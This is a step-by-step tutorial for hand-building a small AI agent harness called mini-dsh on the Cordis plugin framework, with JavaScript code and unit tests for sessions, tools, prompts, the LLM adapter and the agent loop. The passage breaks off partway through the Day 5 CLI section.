# Writing mini-dsh from scratch

English | [中文](./LEARNING.zh-CN.md)

This document is for people **touching an Agent Harness for the first time**.

Don't clone this repo as your starting point, and don't open the source to copy from it. The right way:

1. Create an empty project
2. Write it yourself through the 8 milestones below
3. Every step runs and passes tests
4. Only then open this repo and compare

This repo is the **answer key**, not your workbook.

By the end of the eight-day main track, you will have written all five abstractions of the Harness by hand and hooked up a real model. The sandbox, Bash, file tools, Context7, and skills are **not part of the main track**: they prove `ctx.tools` is enough, and the Loop does not change one line. To match all the source in this repo, do the **Supplement** at the end.

When you compare, use the README and the source; skim `ARCHITECTURE.md` when you lose the big picture. There is no handwritten `src/utils/env.js` — env vars go through `dotenv`.

---

## What you will learn is not "a chatbot"

In one line:

```text
Agent = Model + Harness
```

Model means DeepSeek / OpenAI and friends. Harness is what this project teaches: assembling model, tools, history, policy, and loop into an Agent that actually gets work done.

The core of the Harness is a composable Cordis Context:

```text
ctx.sessions
ctx.systemPrompt
ctx.tools
ctx.llm
ctx.agents
ctx.agentLoop
```

`ctx.sandbox` is a policy gate added in the Supplement — don't reference it ahead of time in the main track. `ctx.skills` is the second supplement.

What a request actually goes through:

```text
User
 ↓
CLI
 ↓
agent.send()
 ↓
AgentLoop
 ↓
SessionEvent: user/message
 ↓
deriveMessages() + systemPrompt + tool schemas
 ↓
LLM
 ├─ no tool_calls -> assistant/message -> return
 └─ has tool_calls
       ↓
   ToolRuntime.execute()
       ↓
   SessionEvent: tool/result
       ↓
   back to LLM
```

The Agent Loop **doesn't know** what Bash, files, or Context7 are. It only knows `ctx.tools`. This is the most valuable lesson in the whole project.

---

## Before you start

- Node.js `>= 20.18.1`
- Some modern JavaScript (`import` / `async` / `class`)
- A DeepSeek API Key (only needed on Day 5)
- This repo as a reference — but don't read the implementation yet

One milestone per day is recommended. Finish that day's tests before moving on.

---

## Repo file overview

For cross-checking. Tick a box at each day's end. Sandbox-related files belong to the Supplement — don't write them into the CLI early.

| Day | Files you should write |
|---|---|
| 0 | `package.json` `.gitignore` `scripts/check-syntax.js` `src/index.js` |
| 1 | `src/core/session-runtime.js` `src/plugins/sessions.js` `test/core.test.js` (Session: two tests) |
| 2 | `src/core/tool-runtime.js` `src/plugins/tools.js` (add 1 test) |
| 3 | `src/core/system-prompt-runtime.js` `src/plugins/system-prompt.js` `src/core/llm-runtime.js` `src/plugins/llm.js` (add 3 tests) |
| 4 | `src/core/agent-runtime.js` `src/plugins/agents.js` `src/core/agent-loop-runtime.js` `src/plugins/agent-loop.js` (add 4 tests) |
| 5 | `.env.example` `src/models/deepseek.js` `src/plugins/runtime-context.js` `src/plugins/cli.js`; change `src/index.js` to wire them in (add 3 tests) |
| 6 | `plugins.config.js` `src/plugins/external-plugins.js`; change `src/index.js` to mount MCP (still no sandbox / bash / files) |
| 7 | No new files. Cross-check against the README and run the core acceptance |
| Supplement | `src/utils/path.js` `src/core/sandbox-runtime.js` `src/plugins/sandbox.js` `src/tools/files.js` `src/tools/bash.js`; change CLI Approval / Esc and `index.js`; add `test/integration.test.js` (add 7 tests to `core.test.js` + 2 integration tests) |
| Skills | `src/core/skill-runtime.js` `src/core/skill-filesystem.js` `src/plugins/skills.js` `src/plugins/skill-filesystem.js` `src/tools/skill.js`; change CLI `/skills` and `index.js` (add 4 tests) |

In this repo, the files you **don't hand-write — just read**: `README.md` `README.zh-CN.md` `pnpm-lock.yaml`.

`test/core.test.js` is cumulative: add each day's tests to it. **By the end of Day 7 of the main track you should have 13 tests.** The sandbox Supplement adds 7 more to it, plus a separate `test/integration.test.js` holding 2 (**22**). Skills add 4 more, matching this repo's **26**. Test titles must be identical to this repo's (in English), so you can cross-check:


| Day | Added | Total | Test title |
|---|---|---|---|
| 0 | 0 | 0 | No `test/` yet — don't run `pnpm test` |
| 1 | 2 | 2 | `Session derives tool-call history from the event log and keeps reasoning_content`; `Session clear keeps the same id and drops derived chat history` |
| 2 | 1 | 3 | `ToolRuntime register returns a disposer and renders results as text` |
| 3 | 3 | 6 | `SystemPrompt assembles by order and disposer unregisters fragments`; `LlmRuntime routes chat to the selected provider and disposer unregisters it`; `LlmRuntime selects an upstream model with provider/model` |
| 4 | 4 | 10 | `Agent loop completes a model -> tool -> model turn`; `Agent loop has no 12-step cap and finishes after 20 tool calls`; `Agent loop streams reasoning, content, tool-call, and tool-result chunks`; `Cancelling a multi-tool turn still records a result for every tool_call` |
| 5 | 3 | 13 | `streamed tool_calls concatenate name once, not read_fileread_file`; `parseSSE flushes a last line without a trailing newline and recognizes data:[DONE]`; `finalizeToolCalls sorts by index, drops empty names, and throws on invalid JSON` |
| 6 | 0 | 13 | MCP has no automated tests. If it connects, verify manually with `/tools`; the CLI must start even if it doesn't |
| 7 | 0 | 13 | All 13 core tests green = pass |
| Supplement | 7 + 2 | 22 | `resolveInside blocks .. and absolute escapes but allows a ..hidden filename`; `resolveInside blocks a symlink inside the workspace that points out of it`; `Sandbox blocks dangerous commands and allows ordinary workspace commands`; `Sandbox approval auto-approves or throws when the user rejects`; `Sandbox expands env paths before the escape check instead of banning them`; `allowHosts uses the provided whitelist and does not hardcode localhost`; `glob matches both substrings and * / ** wildcards`; and in `test/integration.test.js`: `the whole plugin stack boots on Cordis and runs a full model -> tool -> model turn`; `external plugin loader tolerates an optional failure and enforces a required one` |
| Skills | 4 | 26 | `SkillRuntime register returns a disposer and lower rank wins duplicate names`; `parseSkillMarkdown reads kebab-case invocation flags and rejects camelCase keys`; `FileSystemSkillProvider discovers bundle and flat skills and skips invalid files`; `skill tool loads model-invocable bodies and rejects unknown or user-only names` |


**Test boundary (holds for every later day):** `pnpm test` only covers `core/` and a few exported pure functions (SSE; paths, glob, and skill parse/load arrive in the supplements). `src/plugins/*` are thin forwards — **no Cordis integration tests**. Whether your plugins are right is judged by comparing against the source and, from Day 5 on, by manual CLI checks.

---

## Day 0: an empty project that runs

Create a new directory — don't copy files from this repo.

```bash
mkdir mini-dsh-learn && cd mini-dsh-learn
pnpm init
```

### Files to write today

```text
package.json
.gitignore
scripts/check-syntax.js
src/index.js
```

`package.json` at minimum needs these:

```json
{
  "name": "mini-dsh-learn",
  "private": true,
  "type": "module",
  "engines": {
    "node": ">=20.18.1"
  },
  "scripts": {
    "start": "node src/index.js",
    "test": "node --test test/*.test.js",
    "check": "node scripts/check-syntax.js"
  }
}
```

`.gitignore`:

```text
node_modules/
.env
.DS_Store
*.log
```

`scripts/check-syntax.js`: walk `src/` `test/` `scripts/` recursively and run `node --check` on every `.js`. On failure, print stderr and exit non-zero; on success print `syntax ok: N files`. Compare against the same-named file in this repo.

Install the core dependency:

```bash
pnpm add @deepseek-ai/cordis@4.0.1
```

First write a minimal entry to confirm Cordis boots:

```js
// src/index.js
import { Context } from '@deepseek-ai/cordis'

const root = new Context()

await root.plugin({
  name: 'hello',
  apply(ctx) {
    console.log('plugin loaded')
  },
})
```

```bash
node src/index.js
pnpm check
```

You pass when it prints `plugin loaded` and `pnpm check` reports syntax ok. Don't run `pnpm test` on Day 0: `test/` doesn't exist yet, and the shell glob won't match anything, which errors.

This step teaches only four things:

- `Context` is an empty container
- `plugin` stuffs capabilities into it
- The plugin shape is `{ name, apply(ctx) }` — `Service` comes later
- `pnpm check` is the syntax gate; run it first after every day's changes

Align your directory with this repo from the start:

```text
src/
  index.js          # plugin wiring only
  core/             # pure logic, no Cordis imports
  plugins/          # thin wrappers: mount runtimes onto ctx.xxx
  models/           # not until Day 5
  tools/            # Supplement only (bash / files / skill)
  utils/
scripts/
test/
```

Layer separation matters: `core/` doesn't depend on Cordis, so tests can `new SessionRuntime()` directly without booting a whole Context.

Compare: `src/index.js` `scripts/check-syntax.js` `.gitignore` `package.json`

---

## Day 1: Session Event Log

Don't write the LLM first. Write the "chat history" first.

### Files to write today

```text
src/core/session-runtime.js
src/plugins/sessions.js
test/core.test.js
```

### The mental model to build

```text
SessionEvent[] = facts
messages       = projection for the model
```

Don't keep a second `messages[]`. Every user / assistant / tool call / tool result is first recorded as an event; project it into messages only when sending to the model.

### API to implement

| Method | Purpose |
|---|---|
| `create(meta)` | Create a session and write a `session/start` |
| `get(id)` | Get the session; throw if it doesn't exist |
| `append(id, type, data)` | Append an event with `seq` and `at` |
| `clear(id)` | Clear events, then write a `session/start` with `reset: true`. **Keep the same id** — don't delete the session and create a new one |
| `list()` | Return all current sessions |
| `deriveMessages(id)` | Project events into OpenAI-compatible messages |

The object returned by `create()` contains at least: `id` `meta` `events` `createdAt`.

An event contains at least: `seq` (incrementing from 1) `type` `data` `at` (ISO time).

Event types start with only these:

```text
session/start
user/message
assistant/message
assistant/tool_calls
tool/result
```

`session/start` does **not** enter `deriveMessages()`. It's a fact for `/history`, not a message for the model.

### Things to get right

1. `assistant/tool_calls` must be able to carry `reasoningContent`, projected as `reasoning_content`. When there's no reasoning, don't emit the field.
2. `tool/result` must carry `tool_call_id`, mapping to OpenAI's `role: 'tool'`.
3. When projecting `tool_calls`, `arguments` must be `JSON.stringify`-ed.
4. `assistant/message`'s `content` defaults to `''`; `assistant/tool_calls`'s `content` defaults to `null`.
5. `clear(id)` keeps the id, drops history. `/reset` relies on this — don't create a new session.

The projection looks roughly like this:

```js
[
  { role: 'user', content: 'what time is it' },
  {
    role: 'assistant',
    content: null,
    reasoning_content: 'I need to call bash date',
    tool_calls: [
      {
        id: 'c1',
        type: 'function',
        function: { name: 'bash', arguments: '{"command":"date"}' },
      },
    ],
  },
  { role: 'tool', tool_call_id: 'c1', content: '12:00' },
]
```

### Same-day tests

```js
import test from 'node:test'
import assert from 'node:assert/strict'
import { SessionRuntime } from '../src/core/session-runtime.js'

test('Session derives tool-call history from the event log and keeps reasoning_content', () => {
  const sessions = new SessionRuntime()
  const s = sessions.create()

  sessions.append(s.id, 'user/message', { content: 'what time is it' })
  sessions.append(s.id, 'assistant/tool_calls', {
    reasoningContent: 'I need to call bash date',
    toolCalls: [{ id: 'c1', name: 'bash', arguments: { command: 'date' } }],
  })
  sessions.append(s.id, 'tool/result', {
    toolCallId: 'c1',
    content: '12:00',
  })

  const messages = sessions.deriveMessages(s.id)
  assert.equal(messages[1].reasoning_content, 'I need to call bash date')
  assert.equal(messages[1].tool_calls[0].function.name, 'bash')
  assert.equal(messages[2].role, 'tool')
})

test('Session clear keeps the same id and drops derived chat history', () => {
  const sessions = new SessionRuntime()
  const s = sessions.create()
  const id = s.id

  sessions.append(id, 'user/message', { content: 'hello' })
  sessions.append(id, 'assistant/message', { content: 'hi' })
  sessions.clear(id)

  assert.equal(sessions.get(id).id, id)
  assert.equal(sessions.get(id).events[0].type, 'session/start')
  assert.equal(sessions.get(id).events[0].data.reset, true)
  assert.deepEqual(sessions.deriveMessages(id), [])
})
```

```bash
pnpm test
pnpm check
```

### Wrap it as a Cordis Service

`src/plugins/sessions.js` does exactly one thing: mount the runtime onto `ctx.sessions`.

```js
import { Service } from '@deepseek-ai/cordis'
import { SessionRuntime } from '../core/session-runtime.js'

class SessionsService extends Service {
  constructor(ctx) {
    super(ctx, 'sessions')
    this.runtime = new SessionRuntime()
  }
  create(meta) { return this.runtime.create(meta) }
  get(id) { return this.runtime.get(id) }
  append(id, type, data) { return this.runtime.append(id, type, data) }
  clear(id) { return this.runtime.clear(id) }
  list() { return this.runtime.list() }
  deriveMessages(id) { return this.runtime.deriveMessages(id) }
}

export const name = 'mini-sessions'
export function apply(ctx) {
  ctx.plugin(SessionsService)
}
```

Change `src/index.js` to load this plugin; the hello plugin can go. There's no CLI yet, so the process exits right after loading — that's normal.

Every later day adds plugins the same way: write the logic in `core/`, expose `ctx.xxx` in `plugins/`, and mount it in `src/index.js`. The plugin layer itself never goes into `pnpm test` — the runtimes are what's tested.

**Why this first:** every later module writes facts into the Session. If history is wrong, the Agent Loop will be wrong.

Compare: `src/core/session-runtime.js`, `src/plugins/sessions.js`, the first two tests in `test/core.test.js`.

---

## Day 2: Tool Runtime

### Files to write today

```text
src/core/tool-runtime.js
src/plugins/tools.js
test/core.test.js
```

The minimal contract:

```text
register(definition) → disposer
get(name)
list()
schemas()            → OpenAI function tools
execute(name, args, exec)  → { value, content, isError }
renderResult(result) → string
```

### Things to get right

1. `register()` **returns a disposer**. MCP's dynamic add/remove of tools and plugin unload rely on this. It's a no-op if called twice. Delete only the entry that is still that same definition.
2. Name conflicts, missing `name`, missing `execute` — throw at registration. English errors: e.g. `tool.name is required`.
3. Unknown tool or a thrown `execute` both return `{ isError: true, content: [...] }` — **never let the exception escape into the Agent Loop**.
4. `content` is a block array like `[{ type: 'text', text: '...' }]`.
5. If the tool has `output.render(args, value)`, use it to build content; otherwise `JSON.stringify` the value (strings stay as-is).
6. If the tool has `finalizeContent(execution, result)`, run it on the success path and replace `content` with its return value.

The second argument to `execute` is reserved for:

```js
{
  signal,       // new AbortController().signal if not passed
  sessionId,
  toolCallId,
  agent,
}
```

### Same-day tests

```js
test('ToolRuntime register returns a disposer and renders results as text', async () => {
  const tools = new ToolRuntime()
  const dispose = tools.register({
    name: 'echo',
    description: 'echo',
    parameters: { type: 'object' },
    execute: async args => args,
  })

  assert.equal(tools.schemas().length, 1)
  const result = await tools.execute('echo', { a: 1 })
  assert.match(tools.renderResult(result), /"a": 1/)

  dispose()
  assert.equal(tools.schemas().length, 0)
})
```

Then wrap it as `src/plugins/tools.js`, exposing `ctx.tools` with all 6 methods forwarded verbatim, and mount it in `src/index.js`.

Compare: `src/core/tool-runtime.js`, `src/plugins/tools.js`

---

## Day 3: System Prompt + LLM Adapter

Still no real API.

### Files to write today

```text
src/core/system-prompt-runtime.js
src/plugins/system-prompt.js
src/core/llm-runtime.js
src/plugins/llm.js
test/core.test.js
```

### System Prompt

The API deliberately stays close to DSH:

```text
section({ name, order, text }) → disposer
context({ name, order, text }) → disposer
assemble(ctx) → string
inspect()
```

Conventions:

- `section` holds relatively static identity / rules
- `context` holds things that change every step (time, cwd)
- `text` can be a string or an `async (assembleContext) => string`
- `assemble()` merges sections + contexts by `order`, drops empty text, joins paragraphs with `\n\n`
- Duplicate names, missing `name` — throw
- The disposer undoes exactly that fragment; a second call is a no-op
- `inspect()` returns only `{ sections, contexts }`, each entry `{ name, order }`

```js
test('SystemPrompt assembles by order and disposer unregisters fragments', async () => {
  const prompt = new SystemPromptRuntime()
  prompt.section({ name: 'b', order: 20, text: 'B' })
  const dispose = prompt.context({ name: 'a', order: 10, text: () => 'A' })

  assert.equal(await prompt.assemble(), 'A\n\nB')
  dispose()
  assert.equal(await prompt.assemble(), 'B')
})
```

Wrap it as `ctx.systemPrompt`, forwarding `section` / `context` / `assemble` / `inspect`.

### LLM Runtime

The Agent Loop must **never** see a DeepSeek URL or API key. It only calls:

```js
ctx.llm.chat({ system, messages, tools, signal, onReasoning, onContent }, 'mock/demo')
```

The selection format is `provider/model`. `{ provider, model }` is also allowed.

```text
register(provider, adapter, { defaultModel }) → disposer
models()
defaultSelection()
has(selection)
chat(request, selection)
```

To get it right:

1. The first successfully registered adapter with a model decides `defaultSelection` (`defaultModel` wins, otherwise `adapter.models[0]`).
2. `chat()` splits the selection into `{ provider, model }` and passes `model` to the adapter — **don't** hand the whole `deepseek/xxx` string upstream.
3. Bad format, missing provider, missing selection — throw.
4. `has(selection)`: no provider → false; adapter without `models` → true; otherwise `models.includes(model)`.
5. `register` returns a precise disposer.

Both LLM tests for today (both exist in the repo):

```js
test('LlmRuntime routes chat to the selected provider and disposer unregisters it', async () => {
  const llm = new LlmRuntime()
  const calls = []
  const dispose = llm.register('mock', {
    models: ['fast'],
    chat: async request => {
      calls.push(request)
      return { content: 'ok' }
    },
  })

  assert.equal(llm.defaultSelection(), 'mock/fast')
  assert.deepEqual(llm.models(), ['mock/fast'])
  assert.equal(llm.has('mock/fast'), true)

  const reply = await llm.chat({ messages: [] })
  assert.equal(reply.content, 'ok')
  assert.equal(calls[0].model, 'fast')

  dispose()
  assert.deepEqual(llm.models(), [])
})

test('LlmRuntime selects an upstream model with provider/model', async () => {
  const llm = new LlmRuntime()
  let receivedModel = null

  llm.register('mock', {
    models: ['a', 'b'],
    async chat({ model }) {
      receivedModel = model
      return { content: model, toolCalls: [] }
    },
  }, { defaultModel: 'a' })

  assert.deepEqual(llm.models(), ['mock/a', 'mock/b'])
  assert.equal(llm.has('mock/b'), true)

  const result = await llm.chat({}, 'mock/b')
  assert.equal(result.content, 'b')
  assert.equal(receivedModel, 'b')
})
```

Wrap it as `ctx.llm`, forwarding `register` / `models` / `defaultSelection` / `has` / `chat`.

### Same-day tests

Three, and you have already written all of them above: `SystemPrompt assembles by order and disposer unregisters fragments` in the System Prompt section, plus `LlmRuntime routes chat to the selected provider and disposer unregisters it` and `LlmRuntime selects an upstream model with provider/model` in the LLM Runtime section. Each one sits directly under the API it checks, which is where a test is easiest to read. Titles identical to this repo's — don't rename them. Cumulative after today: **6**.

Compare: `src/core/system-prompt-runtime.js`, `src/plugins/system-prompt.js`, `src/core/llm-runtime.js`, `src/plugins/llm.js`

---

## Day 4: Agent Loop (the heart of the project)

### Files to write today

```text
src/core/agent-runtime.js
src/plugins/agents.js
src/core/agent-loop-runtime.js
src/plugins/agent-loop.js
test/core.test.js
```

### Agent Runtime

An Agent is just a handle:

```js
{
  id,          // randomUUID()
  name,        // default 'default'
  sessionId,
  model,
  async send(input, options) {
    return loop.run(agent, input, options)
  },
}
```

Also: `register(agent) → disposer`, `create({ sessionId, model, loop, name })`, `list()`. Don't write the loop inside the Agent, and don't call tools from it.

Wrap it as `ctx.agents`.

### Agent Loop Runtime

The constructor takes four dependencies: `{ sessions, systemPrompt, tools, llm }`. The pseudocode below is the final implementation:

```js
async run(agent, input, { signal, onReasoning, onContent, onToolCall, onToolResult } = {}) {
  const sessionId = agent.sessionId
  this.sessions.append(sessionId, 'user/message', { content: input })

  let step = 0
  while (true) {
    step += 1
    if (signal?.aborted) throw new Error('Agent run cancelled')

    const system = await this.systemPrompt.assemble({ agent, sessionId, step })
    const messages = this.sessions.deriveMessages(sessionId)

    const response = await this.llm.chat({
      system,
      messages,
      tools: this.tools.schemas(),
      signal,
      onReasoning,
      onContent,
    }, agent.model)

    const toolCalls = response.toolCalls ?? []

    if (toolCalls.length === 0) {
      this.sessions.append(sessionId, 'assistant/message', {
        content: response.content ?? '',
      })
      return response.content ?? ''
    }

    this.sessions.append(sessionId, 'assistant/tool_calls', {
      content: response.content ?? null,
      reasoningContent: response.reasoningContent,
      toolCalls,
    })

    // Cancelling must not abandon a tool_call halfway — see "Things to get right" 6.
    let cancelled = false

    for (const call of toolCalls) {
      cancelled ||= Boolean(signal?.aborted)
      if (cancelled) {
        this.sessions.append(sessionId, 'tool/result', {
          toolCallId: call.id,
          name: call.name,
          isError: true,
          content: CANCELLED_RESULT,
        })
        continue
      }
      onToolCall?.(call)
      const result = await this.tools.execute(call.name, call.arguments, {
        signal,
        sessionId,
        toolCallId: call.id,
        agent,
      })
      const renderedContent = this.tools.renderResult(result)
      onToolResult?.({ ...result, renderedContent, name: call.name, toolCallId: call.id })
      this.sessions.append(sessionId, 'tool/result', {
        toolCallId: call.id,
        name: call.name,
        isError: result.isError,
        content: renderedContent,
      })
    }

    if (cancelled) throw new Error('Agent run cancelled')
  }
}
```

The learning version deliberately has **no maxSteps**. The only normal-stop condition is the model returning no `tool_calls`. Cancellation goes through `signal`.

### Things to get right

1. Re-`assemble()` the system prompt every step.
2. messages must be projected from the SessionEvents.
3. With tool calls, `reasoningContent` must be written together with that turn's `assistant/tool_calls`.
4. One model turn may request several tools; run them all before returning to the model.
5. Streaming callbacks are just pass-throughs.
6. Check `signal.aborted` before entering the model. Inside the tool loop, **do not throw halfway**. A `tool_call` left without its `tool/result` makes `deriveMessages()` project an assistant tool_calls message whose ids have no tool reply, and Chat Completions rejects that payload — so one cancelled turn would poison every later turn in the same session. Append a cancelled result for each remaining call instead, and throw only after the loop, once the log is consistent again:

   ```js
   const CANCELLED_RESULT = 'ToolError: the run was cancelled before this tool ran'
   ```

   Note this is only reachable when one model turn requested **several** tools. With a single call, `tools.execute()` swallows the abort and returns an `isError` result, which still gets logged — the run then stops at the `while` check on the next step, with the log already consistent.

### Same-day tests (still no real model)

Write all four into `test/core.test.js` with titles identical to this repo's. Key points:

1. `Agent loop completes a model -> tool -> model turn`: the mock returns a clock tool call first; on the second call it reads `messages.at(-1).role === 'tool'` and answers. `calls === 2`.
2. `Agent loop has no 12-step cap and finishes after 20 tool calls`: the first 20 calls return tick; number 21 returns `done`.
3. `Agent loop streams reasoning, content, tool-call, and tool-result chunks`: first call `onReasoning('think-1')` / `onReasoning('think-2')` then a tool call; second call `onContent('hello ')` / `onContent('world')`.
4. `Cancelling a multi-tool turn still records a result for every tool_call`: the mock returns **two** calls to the same tool in one turn; the tool's `execute` calls `abort()` on its first invocation. Assert `agent.send(..., { signal })` rejects with `/cancelled/i`, then project with `deriveMessages()` and assert the ids collected from `tool_calls` and the ids collected from the `role: 'tool'` messages are the same list — `['t1', 't2']` on both sides. Write this test **before** the fix in point 6 and watch it fail; a regression test you never saw fail is guarding nothing.

```js
test('Agent loop completes a model -> tool -> model turn', async () => {
  const sessions = new SessionRuntime()
  const systemPrompt = new SystemPromptRuntime()
  const tools = new ToolRuntime()
  const llm = new LlmRuntime()
  const agents = new AgentRuntime()

  tools.register({
    name: 'clock',
    description: 'clock',
    parameters: { type: 'object', properties: {} },
    execute: async () => '2026-08-25T17:25:00+08:00',
  })

  let calls = 0
  llm.register(
    'mock',
    {
      models: ['demo'],
      async chat({ messages }) {
        calls += 1
        if (calls === 1) {
          return {
            reasoningContent: 'look up the time first',
            toolCalls: [{ id: 't1', name: 'clock', arguments: {} }],
          }
        }

        const toolMessage = messages.at(-1)
        assert.equal(toolMessage.role, 'tool')
        return { content: `it is ${toolMessage.content}`, toolCalls: [] }
      },
    },
    { defaultModel: 'demo' },
  )

  const s = sessions.create()
  const loop = new AgentLoopRuntime({ sessions, systemPrompt, tools, llm })
  const agent = agents.create({
    sessionId: s.id,
    model: 'mock/demo',
    loop,
  })

  const answer = await agent.send('what time is it')
  assert.match(answer, /2026-08-25/)
  assert.equal(calls, 2)
})

test('Agent loop has no 12-step cap and finishes after 20 tool calls', async () => {
  const sessions = new SessionRuntime()
  const systemPrompt = new SystemPromptRuntime()
  const tools = new ToolRuntime()
  const llm = new LlmRuntime()
  const agents = new AgentRuntime()

  tools.register({
    name: 'tick',
    description: 'tick',
    parameters: { type: 'object', properties: {} },
    execute: async () => 'ok',
  })

  let modelCalls = 0
  llm.register(
    'mock',
    {
      models: ['long'],
      async chat() {
        modelCalls += 1
        if (modelCalls <= 20) {
          return {
            toolCalls: [
              {
                id: `call-${modelCalls}`,
                name: 'tick',
                arguments: {},
              },
            ],
          }
        }
        return { content: 'done', toolCalls: [] }
      },
    },
    { defaultModel: 'long' },
  )

  const s = sessions.create()
  const loop = new AgentLoopRuntime({ sessions, systemPrompt, tools, llm })
  const agent = agents.create({
    sessionId: s.id,
    model: 'mock/long',
    loop,
  })

  const answer = await agent.send('run a long task')
  assert.equal(answer, 'done')
  assert.equal(modelCalls, 21)
})

test('Agent loop streams reasoning, content, tool-call, and tool-result chunks', async () => {
  const sessions = new SessionRuntime()
  const systemPrompt = new SystemPromptRuntime()
  const tools = new ToolRuntime()
  const llm = new LlmRuntime()
  const agents = new AgentRuntime()

  tools.register({
    name: 'search',
    description: 'search tool',
    parameters: { type: 'object', properties: { q: { type: 'string' } } },
    execute: async args => `result for ${args.q}`,
  })

  let step = 0
  llm.register(
    'mock',
    {
      models: ['stream-model'],
      async chat({ onReasoning, onContent }) {
        step += 1
        if (step === 1) {
          onReasoning?.('think-1')
          onReasoning?.('think-2')
          return {
            reasoningContent: 'think-1think-2',
            toolCalls: [{ id: 'tc1', name: 'search', arguments: { q: 'foo' } }],
          }
        }
        onContent?.('hello ')
        onContent?.('world')
        return {
          content: 'hello world',
          toolCalls: [],
        }
      },
    },
    { defaultModel: 'stream-model' },
  )

  const s = sessions.create()
  const loop = new AgentLoopRuntime({ sessions, systemPrompt, tools, llm })
  const agent = agents.create({
    sessionId: s.id,
    model: 'mock/stream-model',
    loop,
  })

  const reasoningChunks = []
  const contentChunks = []
  const toolCalls = []
  const toolResults = []

  const answer = await agent.send('test stream', {
    onReasoning: c => reasoningChunks.push(c),
    onContent: c => contentChunks.push(c),
    onToolCall: tc => toolCalls.push(tc),
    onToolResult: tr => toolResults.push(tr),
  })

  assert.equal(answer, 'hello world')
  assert.deepEqual(reasoningChunks, ['think-1', 'think-2'])
  assert.deepEqual(contentChunks, ['hello ', 'world'])
  assert.equal(toolCalls.length, 1)
  assert.equal(toolCalls[0].name, 'search')
  assert.equal(toolResults.length, 1)
  assert.match(toolResults[0].renderedContent, /result for foo/)
})

test('Cancelling a multi-tool turn still records a result for every tool_call', async () => {
  const sessions = new SessionRuntime()
  const systemPrompt = new SystemPromptRuntime()
  const tools = new ToolRuntime()
  const llm = new LlmRuntime()
  const agents = new AgentRuntime()

  const abort = new AbortController()

  tools.register({
    name: 'slow',
    description: 'slow',
    parameters: { type: 'object', properties: {} },
    // Cancel while the first of two calls is in flight.
    execute: async () => {
      abort.abort()
      return 'first result'
    },
  })

  llm.register(
    'mock',
    {
      models: ['demo'],
      async chat() {
        return {
          toolCalls: [
            { id: 't1', name: 'slow', arguments: {} },
            { id: 't2', name: 'slow', arguments: {} },
          ],
        }
      },
    },
    { defaultModel: 'demo' },
  )

  const s = sessions.create()
  const loop = new AgentLoopRuntime({ sessions, systemPrompt, tools, llm })
  const agent = agents.create({ sessionId: s.id, model: 'mock/demo', loop })

  await assert.rejects(() => agent.send('run both', { signal: abort.signal }), /cancelled/i)

  // Every id in the assistant tool_calls message must have a tool reply, or
  // the next request in this session is rejected by the provider.
  const messages = sessions.deriveMessages(s.id)
  const requested = messages
    .filter(message => message.tool_calls)
    .flatMap(message => message.tool_calls.map(call => call.id))
  const answered = messages
    .filter(message => message.role === 'tool')
    .map(message => message.tool_call_id)

  assert.deepEqual(requested, ['t1', 't2'])
  assert.deepEqual(answered, ['t1', 't2'])
})
```

### The plugin layer

`src/plugins/agent-loop.js` must declare its dependencies:

```js
export const inject = ['sessions', 'systemPrompt', 'tools', 'llm']
```

Also write `static inject = [...]` on the Service class. In the constructor, `new AgentLoopRuntime({ sessions: ctx.sessions, systemPrompt: ctx.systemPrompt, tools: ctx.tools, llm: ctx.llm })`, exposing only `run` outward.

Compare: `src/core/agent-loop-runtime.js`, `src/core/agent-runtime.js`, the two plugins, the three loop tests.

---

## Day 5: real model + runtime context + minimal CLI

This is when vendor details appear. The Agent Loop doesn't change one line.

### Files to write today

```text
.env.example
src/models/deepseek.js
src/plugins/runtime-context.js
src/plugins/cli.js
src/index.js
test/core.test.js
```

Don't hand-write `src/utils/env.js`. This repo uses `dotenv`:

```bash
pnpm add dotenv
```

`src/index.js` must call `dotenv.config()` **first**, before dynamically importing configuration that reads env vars. Don't override existing `process.env` (dotenv's default).

### Environment variables

`.env.example`, aligned with this repo:

```text
# DeepSeek
DEEPSEEK_API_KEY=
DEEPSEEK_BASE_URL=https://api.deepseek.com

# Default model. Format: provider/model
MINI_DSH_MODEL=deepseek/deepseek-v4-flash

# Directory the agent works in; defaults to the process cwd.
# MINI_DSH_WORKSPACE=/absolute/path/to/project

# Optional Context7 MCP key. The host still starts if mcp.context7.com is unreachable.
# CONTEXT7_API_KEY=
```

`MINI_DSH_AUTO_APPROVE` is only used by the Supplement's sandbox — don't write it into the CLI during the main track. Without `MINI_DSH_MODEL`, the entry falls back to `deepseek/deepseek-v4-pro`.

```bash
cp .env.example .env
```

### DeepSeek Adapter

`src/models/deepseek.js` is a **Provider Adapter**, not an Agent. `name = 'mini-model-deepseek'`, `inject = ['llm']`.

It is responsible for:

1. Reading `DEEPSEEK_API_KEY` / `DEEPSEEK_BASE_URL` (default `https://api.deepseek.com`, trailing `/` trimmed)
2. Default model list `deepseek-v4-pro`, `deepseek-v4-flash`
3. Thinking defaults to `process.env.DEEPSEEK_THINKING ?? 'enabled'`
4. Turning `{ system, messages, tools }` into a Chat Completions body with `stream: true`
5. Parsing SSE into `{ content, reasoningContent, toolCalls }`
6. Mounting via `ctx.effect(() => ctx.llm.register('deepseek', adapter, { defaultModel }), 'register deepseek provider')`

Missing key throws `missing DEEPSEEK_API_KEY; copy .env.example to .env and fill it in`. No response body throws `DeepSeek API returned no response body`.

Two streaming pitfalls:

1. **The last SSE line may lack `\n`** — on `done`, parse the remaining line in the buffer.
2. **`delta.tool_calls`' `function.name` is concatenated.** Start from an empty string and `name += delta.name`, or names become `read_fileread_file`.

Export these pure functions for the unit tests:

```text
parseSSE(response)
accumulateToolCallDelta(map, tc)
finalizeToolCalls(map)
parseToolArguments(text)    # '' → {}; invalid JSON throws incomplete tool arguments JSON
```

`parseSSE` must also recognize `data: [DONE]` / `data:[DONE]` and ignore `:`-prefixed comment lines and blank lines.

### Runtime Context

`src/plugins/runtime-context.js`. `inject = ['systemPrompt']`.

Time is not a model capability — it's real-world state the Harness injects every time it assembles the prompt. Mount two fragments with `ctx.effect(...)`:

1. `section` `agent:identity` `order: 10`: a general-purpose agent in a local harness; prefer tools when a question can be verified with them; when asked which tools exist, answer from this request's tool list; **English by default** (`Reply in English by default.`).
2. `context` `runtime:environment` `order: 100`: current time, time zone, workspace, platform, Node version, hostname — read fresh at each `assemble`.

`workspace` comes from `config.workspace ?? process.env.MINI_DSH_WORKSPACE ?? process.cwd()`, `path.resolve`-ed.

### Minimal CLI

`src/plugins/cli.js` is only the thinnest UI layer. Day 5's `inject` must **not** include `'sandbox'`:

```js
export const inject = ['sessions', 'agents', 'agentLoop', 'tools', 'systemPrompt', 'llm']
```

What it does:

1. `ctx.sessions.create({ source: 'cli' })`
